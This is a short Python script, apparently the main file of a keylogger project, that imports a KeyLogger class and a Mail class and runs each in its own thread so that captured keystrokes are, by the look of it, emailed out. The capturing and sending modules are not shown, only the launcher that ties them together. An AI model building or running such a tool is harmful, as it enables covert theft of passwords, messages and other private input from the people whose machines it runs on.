import threading

from key_logger import KeyLogger
from mail import Mail


def main():
    key_logging_thread = threading.Thread(target=KeyLogger().run)
    mailing_thread = threading.Thread(target=Mail().start)

    key_logging_thread.start()
    mailing_thread.start()


if __name__ == "__main__":
    main()
